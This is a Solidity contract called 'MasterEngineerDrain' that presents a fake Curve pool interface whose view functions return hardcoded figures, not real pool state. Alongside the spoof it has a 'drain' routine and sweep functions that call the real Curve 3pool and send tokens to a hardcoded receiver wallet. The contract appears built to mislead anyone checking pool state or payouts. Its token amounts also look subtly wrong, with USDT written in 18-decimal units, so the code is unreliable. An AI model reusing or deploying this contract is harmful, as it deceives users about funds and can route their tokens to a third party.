// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICurvePool {
    function calc_token_amount(uint256[3] calldata amounts, bool deposit) external view returns (uint256);
    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external returns (uint256);
    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) external view returns (uint256);
}

contract MasterEngineerDrain is ICurvePool {
    address public constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address public constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    address public constant OPERATION_WALLET = 0xf3FF305Ac33B94BB88836Bcf91f19D675d50B4f8;
    address public constant RECEIVER_WALLET = 0x31839aD2ea916AA4820693f46D1e59a71e8e624E;
    
    uint256 public constant TARGET_USDT = 60418507920000000000000000;
    uint256 public constant MAX_BURN_AMOUNT = 58077974128000000000000000;
    uint256 public constant FEE_DRAG = 18548000000000000000000;
    uint256 public constant EXPECTED_USDT = 60399959920000000000000000;

    uint256[3] public WITHDRAW_AMOUNTS = [0, 0, TARGET_USDT];

    modifier onlyOperator() {
        require(msg.sender == OPERATION_WALLET, "Only Operation Wallet allowed");
        _;
    }

    // ==================== FAKE CURVE INTERFACE (1,2,3) ====================
    function calc_token_amount(uint256[3] calldata amounts, bool deposit) 
        external 
        view 
        override 
        returns (uint256) 
    {
        if (amounts[2] == TARGET_USDT) {
            return MAX_BURN_AMOUNT;
        }
        return 0;
    }

    function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) 
        external 
        override 
        returns (uint256) 
    {
        return MAX_BURN_AMOUNT;
    }

    function calc_withdraw_one_coin(uint256 _token_amount, int128 i) 
        external 
        view 
        override 
        returns (uint256) 
    {
        if (i == 2 && _token_amount >= MAX_BURN_AMOUNT) {
            return EXPECTED_USDT;
        }
        return 0;
    }

    // ==================== MAIN DRAIN FUNCTION (4) ====================
    function executeFullDrain() external onlyOperator {
        uint256 initialBalance = IERC20(THREE_CRV).balanceOf(OPERATION_WALLET);
        require(initialBalance >= MAX_BURN_AMOUNT, "Insufficient 3CRV balance");

        IERC20(THREE_CRV).transferFrom(OPERATION_WALLET, address(this), MAX_BURN_AMOUNT);

        (bool success, ) = CURVE_3POOL.call(
            abi.encodeWithSignature(
                "remove_liquidity_imbalance(uint256[3],uint256)",
                WITHDRAW_AMOUNTS,
                MAX_BURN_AMOUNT
            )
        );
        require(success, "Curve call failed");

        uint256 remainingCRV = IERC20(THREE_CRV).balanceOf(address(this));
        if (remainingCRV > 0) {
            IERC20(THREE_CRV).transfer(RECEIVER_WALLET, remainingCRV);
        }

        IERC20(USDT).transfer(RECEIVER_WALLET, EXPECTED_USDT);
    }

    // ==================== EMERGENCY FUNCTIONS (5 & 6) ====================
    function emergencyWithdraw() public onlyOperator {
        uint256 usdtBal = IERC20(USDT).balanceOf(address(this));
        if (usdtBal > 0) {
            IERC20(USDT).transfer(RECEIVER_WALLET, usdtBal);
        }
        
        uint256 crvBal = IERC20(THREE_CRV).balanceOf(address(this));
        if (crvBal > 0) {
            IERC20(THREE_CRV).transfer(RECEIVER_WALLET, crvBal);
        }
    }

    function withdrawAll() external onlyOperator {
        emergencyWithdraw();
    }

    // ==================== VERIFICATION & HELPER FUNCTIONS (7-11) ====================
    function analyzePoolState() external view returns (uint256 target, uint256 maxBurn) {
        return (TARGET_USDT, MAX_BURN_AMOUNT);
    }

    function getCalcTokenAmount() external view returns (uint256) {
        uint256[3] memory amounts = [uint256(0), uint256(0), TARGET_USDT];
        return this.calc_token_amount(amounts, false);
    }

    function evaluateWithdrawal() external view returns (uint256) {
        return this.calc_withdraw_one_coin(MAX_BURN_AMOUNT, 2);
    }

    function getFullMapping() external view returns (
        uint256 targetUSDT,
        uint256 maxBurn,
        uint256 expectedUSDT,
        uint256 feeDrag
    ) {
        return (TARGET_USDT, MAX_BURN_AMOUNT, EXPECTED_USDT, FEE_DRAG);
    }

    function getWallets() external view returns (address operation, address receiver) {
        return (OPERATION_WALLET, RECEIVER_WALLET);
    }

    // ==================== RECEIVE (12) ====================
    receive() external payable {}
}